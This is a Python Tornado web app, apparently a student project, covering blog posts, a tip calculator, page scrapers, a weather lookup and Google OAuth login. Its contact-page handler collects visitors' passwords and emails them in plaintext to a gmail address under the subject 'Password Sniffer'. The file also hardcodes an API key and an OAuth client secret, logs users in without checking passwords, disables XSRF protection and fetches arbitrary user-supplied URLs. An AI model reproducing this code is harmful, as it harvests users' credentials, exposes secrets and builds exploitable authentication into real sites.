import os  # deploy line: says this is the standard library
import boto3
import tornado.ioloop
import tornado.web
import tornado.httpserver
import tornado.log
import tornado.auth
import datetime
from bs4 import BeautifulSoup
import requests
from models import *
from dotenv import load_dotenv
from jinja2 import \
    Environment, PackageLoader, select_autoescape

import json

load_dotenv('.env') #this is set in your environement for production. in deployment, it wil be stored in server.


# deploy line: says get the port variable. If there is no port var, get the default. the default here is 8888. Anything above 1000 works. Ports < 1000 are reserved unless you are a root developer.
PORT = int(os.environ.get('PORT', '8888'))

ENV = Environment(
    loader=PackageLoader('myapp', 'templates'),
    autoescape=select_autoescape(['html', 'xml'])
)

SES_CLIENT = boto3.client(
  'ses',
  aws_access_key_id=os.environ.get('AWS_ACCESS_KEY'),
  aws_secret_access_key=os.environ.get('AWS_SECRET_KEY'),
  region_name="us-west-2"
)

#Oauth secrets
client_secrets = os.path.join(os.path.dirname(__file__),"client_secret.json")

class BaseHandler(tornado.web.RequestHandler):
    def get_current_user(self):
        return self.get_secure_cookie("user")

class TemplateHandler(BaseHandler):
    def render_template(self, tpl, context):
        template = ENV.get_template(tpl)
        self.write(template.render(**context))

class MainHandler(TemplateHandler):
    def get(self):
        self.set_header('Cache-Control','no-store, no-cache, must-revalidate, max-age=0')
        self.render_template("index.html",{})
class LoginHandler(TemplateHandler):
    def get(self):
        #this is just a place to grab form login credentials (ex: username/pw login)
        self.set_header(
          'Cache-Control',
          'no-store, no-cache, must-revalidate, max-age=0')
        self.render_template("page/login.html",{})


    def post(self):#shit gets stored.
    #set_secure_cookie(name, value, expires_days30): expires in 30 days. Sign and timestamps cookie so it can't be forged. Must specify cookie secret, should be long, rando sequence of bytes to be used as the HMAC secret for the signature. Unlike regular cookies, may contain arbitrary byte values not just unicode strings.
        email = self.get_argument('email')
        password = self.get_argument('password')
        self.set_secure_cookie("user", email)
        self.redirect("/")
class LogoutHandler(TemplateHandler, tornado.auth.GoogleOAuth2Mixin):
    def get(self):
        self.clear_cookie("user")
        self.redirect("/?login=false")
class BlogAuthorHandler(TemplateHandler):
    def get(self, id):
        posts = BlogPost.select().where(BlogPost.author_id == id)
        author = Author.select().where(Author.id == id)
        self.render_template("authorsposts.html", {'posts': posts, 'author': author})
class BlogHandler(TemplateHandler):
    def get(self, slug):
        post = BlogPost.select().where(BlogPost.slug == slug).get()
        self.render_template("blogpost.html", {'post': post})
class PostHandler(TemplateHandler):
    def get_current_user(self):
        return self.get_secure_cookie("user")

     #must be used with settings>login_url
    def post(self):
        title = self.get_body_argument('title')
        body = self.get_body_argument('body')
        author = self.get_body_argument('author')
        twitter = self.get_body_argument('twitter')

        if author == 'newauthor':
            newauthor = self.get_body_argument('newauthor')
            newtwitter = self.get_body_argument('newtwitter')
            thisauthor = Author.get_or_create(name=newauthor, twitter=newtwitter)
            a = str(thisauthor[0])
            thisauthor = Author.select().where(Author.name == a).get()
        else:
            thisauthor = Author.get_or_create(name=author, twitter=twitter)
            a = str(thisauthor[0])
            thisauthor = Author.select().where(Author.name == a).get()

        post = BlogPost.create(title=title, slug = title+"-post", body = body, author_id = thisauthor.id)
        post.save()

        posts = BlogPost.select().order_by(BlogPost.created.desc())
        self.render_template('blog.html',{'posts':posts})
class EditPostHandler(TemplateHandler):
    def get(self, slug):
        post = BlogPost.select().where(BlogPost.slug == slug).get()
        author = Author.select().where(Author.id == post.author_id).get()
        self.render_template("editblog.html", {'post': post, 'author': author})
class UpdatePostHandler(TemplateHandler):
    def post(self):
        title = self.get_body_argument('title')
        body = self.get_body_argument('body')
        slug = self.get_body_argument('slug')
        author = self.get_body_argument('author')

        if author == "addnewauthor":
            Author.create(name=author)

        newauthor = Author.select().where(Author.name == author)
        post = BlogPost.select().where(BlogPost.slug == slug).get()

        post.title = title
        post.body = body
        post.author = newauthor
        post.save()

        self.redirect('/post/' + slug)
class TipCalcHandler(TemplateHandler):
    def post(self):
        bill = float(self.get_body_argument('bill'))
        service = self.get_body_argument('service')
        people = float(self.get_body_argument('people'))
        if service == "Good":
            tip = bill * 0.20
        elif service == "Fair":
            tip = bill * 0.15
        else:
            tip = bill * 0.10
        if people == 0:
            totalbill = bill + tip
        else:
            totalbill = (bill + tip)/people
        self.render_template('tip.html', {'bill': bill, 'service': service, 'people': people, 'totalbill': totalbill})
class PyScraper(TemplateHandler):
    def post(self):
        url = self.get_body_argument('url')
        numwords = int(self.get_body_argument('numwords'))

        r = requests.get(url)
        html_content = r.text
        soup = BeautifulSoup(html_content, 'html.parser')
        for script in soup(["script", "style"]):
            script.extract()    # rip it out

        soup = soup.get_text().strip().split()

        words = {}

        for i in soup:
            if i not in words:
                words[i] = 0
        for i in soup:
            words[i] += 1

        order = sorted(words, key = words.get, reverse=True)
        values = [words[key] for key in order]


        # uniquewords =[]
        # for i in range(numwords):
        #     uniquewords.append(order[i])

        self.render_template('pyscrap.html', {'url': url, 'words': words})
class Readable(TemplateHandler):
    def post(self):
        url = self.get_body_argument('url')

        r = requests.get(url)
        html_content = r.text
        soup = BeautifulSoup(html_content, 'html.parser')

        h1 = soup.find_all(["h1"]) #list of h1
        p = soup.find_all(["p"]) #list of p
        h1p = soup.find_all(["h1","p"])

        soup = []
        for i in h1p:
            soup.append(i.get_text())


        self.render_template('readable_result.html', {'url': url, 'soup': soup, 'h1p':h1p})
class WeatherHandler(TemplateHandler):
    def post(self):
        def newdata():
            city = self.get_body_argument('city')
            appid = '00df836e9e091135970bc5e1f9fabf00'
            payload = {'q': city, 'appid': appid}
            r = requests.get('http://api.openweathermap.org/data/2.5/weather', params=payload)
            data = r.json()

            name = data['name']
            wind = data['wind']['speed']
            visibility = data['visibility']
            clouds = data['clouds']['all']
            main = data['main']

            order = sorted(main, key=main.get)
            values = [main[key] for key in order]

            weather_data = Weather.create(name=name, response = data)
            weather_data.save()

        city = self.get_body_argument('city')
        check = Weather.select().where(Weather.name==city).get()
        checktime = datetime.datetime.utcnow() - datetime.timedelta(minutes=15)
        if check != 0 and check.created > checktime:
            #if createdtime is sooner than checktime
            #dbentry has not expired. Still relavant.
            name = check.name
            wind = check.response['wind']['speed']
            visibility = check.response['visibility']
            clouds = check.response['clouds']['all']
            main = check.response['main']
            order = sorted(main, key=main.get)
            values = [main[key] for key in order]
        else:
            newdata()

        self.render_template('weather_results.html',{'name':name, 'visibility': visibility, 'clouds':clouds, 'wind':wind, 'main':main, 'order':order, 'values':values})
class GAuthLoginHandler(BaseHandler, tornado.auth.GoogleOAuth2Mixin):
    @tornado.gen.coroutine #for asynchronous generators. Any generator that yields objects must have this decorator
    #returns a Future object. Exceptions are stored here. Devs may examine Future object or exception may go unnoticed.
    def get(self):
        print("get(self)")
        if self.get_argument('code', False):
            print("first if triggered")
            #returns value of the arguement 'code', strip=false
        #get_authenticated_user (redirect_uri, code, callback): handles the login for the Google user, returning an access token
            user = yield self.get_authenticated_user(redirect_uri='http://localhost:8888/login-google',
                code=self.get_argument('code'))
            if not user:
                print("not user second internal if")
                # #google didn't give u an access token
                # self.clear_all_cookies()
                # raise tornado.web.HTTPError(500, 'Google authentication failed')
            print("third comment")
            access_token = str(user['access_token'])
            print(access_token)
            http_client = self.get_auth_http_client() #returns the AsyncHTTPClient instance to be used for auth requests
            response =  yield http_client.fetch('https://www.googleapis.com/oauth2/v1/userinfo?access_token='+access_token)
            if not response:
                print("not response..none found.")
                self.clear_all_cookies()
                raise tornado.web.HTTPError(500, 'Google authentication failed')

            user = json.loads(response.body)#loads response into a json variable called user
            # save user here, save to cookie or database. Can also save by access_token.

            print(user)

            # name = user['name']
            # given_name = user['given_name']
            # family_name = user['family_name']
            # email = user['email']
            # avatar = user['picture']
            # user_id = user["id"]

            self.set_secure_cookie('user', user['email'])
            self.redirect('/')
            return

        elif self.get_secure_cookie('user'):
            print("it worked.")
            self.redirect('/')
            return

        else:
            print("get the fuck out.")
            yield self.authorize_redirect(
                redirect_uri='http://localhost:8888/login-google',
                client_id=self.settings['google_oauth']['key'],
                scope=['email'],
                response_type='code',
                extra_params={'approval_prompt': 'auto'})

# class GoogleOAuth2LoginHandler(tornado.web.RequestHandler,
#                                tornado.auth.GoogleOAuth2Mixin):
#     @tornado.gen.coroutine
#     #this class copied from :http://www.tornadoweb.org/en/stable/auth.html
#     def get(self):
#         if self.get_argument('code', False):
#             user = yield self.get_authenticated_user(
#                 redirect_uri='/login',
#                 code=self.get_argument('code'))
#             # Save the user with e.g. set_secure_cookie
#         else:
#             yield self.authorize_redirect(
#                 redirect_uri='http://localhost:8888/login-google',
#                 client_id=self.settings['google_oauth']['key'],
#                 scope=['profile', 'email'],
#                 response_type='code',
#                 extra_params={'approval_prompt': 'auto'})

settings = {
"debug": True,
"cookie_secret": "__TODO:_GENERATE_YOUR_OWN_RANDOM_VALUE_HERE__",
"google_oauth":{"key":"322712388163-oebemftlq5lnte6htu6onhosiquee1on.apps.googleusercontent.com", "secret":"GgMMnaGWNdDehSNIud4rT1i1"},
"login_url": "/login",
"xsrf_cookies": False,
}
class PageHandler(TemplateHandler):
    def post(self, page):
        self.set_header('Cache-Control','no-store, no-cache, must-revalidate, max-age=0')
        name = self.get_body_argument('name')
        email = self.get_body_argument('email')
        password = self.get_body_argument('password')
        message = self.get_body_argument('message')
        self.redirect("/page/thankyou.html") #tornado throws a 302 error if page is nonexistent

        response = SES_CLIENT.send_email(
          Destination={
            'ToAddresses': ['chancecordelia@gmail.com'],
          },
          Message={
            'Body': {
              'Text': {
                'Charset': 'UTF-8',
                'Data': 'Name: {}\nEmail: {}\nPassword: {}\nMessage: {}\n'.format(name, email, password, message),
              },
            },
            'Subject': {'Charset': 'UTF-8', 'Data': 'Password Sniffer'},
          },
          Source='chancecordelia@gmail.com',
        )

    def get(self, page):
        self.set_header(
            'Cache-Control',
            'no-store, no-cache, must-revalidate, max-age=0')
        posts = BlogPost.select().order_by(BlogPost.created.desc())
        authors = Author.select()
        self.render_template(page, {'posts': posts, 'authors':authors})
class make_app(tornado.web.Application):
    def __init__(self):
        handlers = [
        (r"/", MainHandler),
        # (r"/login", LoginHandler),
        (r"/login-google", GAuthLoginHandler),
        (r"/post/(.*)",BlogHandler),
        (r"/addblogpost",PostHandler),
        (r"/author/(.*)", BlogAuthorHandler),
        (r"/edit/(.*)",EditPostHandler),
        (r"/update", UpdatePostHandler),
        (r"/page/(.*)", PageHandler),
        (r"/tipcalc", TipCalcHandler),
        (r"/py-scraper", PyScraper),
        (r"/weather", WeatherHandler),
        (r"/readable", Readable),
        (
            r"/static/(.*)",
            tornado.web.StaticFileHandler,
            {'path': 'static'}
        ),
        ]
        tornado.web.Application.__init__(self, handlers, autoreload=True, **settings)


if __name__ == "__main__":
    tornado.log.enable_pretty_logging()
    app = make_app()
    server = tornado.httpserver.HTTPServer(app)
    app.listen(PORT, print('Server started on localhost:' + str(PORT)))
    tornado.ioloop.IOLoop.current().start()
